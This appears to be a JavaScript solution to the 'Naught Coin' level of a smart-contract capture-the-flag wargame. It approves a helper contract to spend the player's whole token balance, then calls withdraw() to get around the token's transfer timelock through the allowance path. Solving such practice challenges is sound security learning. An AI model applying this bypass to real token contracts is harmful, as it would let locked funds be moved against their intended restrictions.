const earlyExit = "0x9f18D437D98F67943c7774Fb87a12ca24F81f81F";
const earlyExitAbi = [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_naughtCoin",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "withdraw",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	];

// Approve EarlyExit contract to spend playerBalance
const playerBalance = (await contract.balanceOf(player)).toString();
await contract.approve(earlyExit, playerBalance, { from: player });

const EarlyExit = new web3.eth.Contract(earlyExitAbi, earlyExit);

// Move tokens from player to EarlyExit
await EarlyExit.methods.withdraw().send({ from: player });

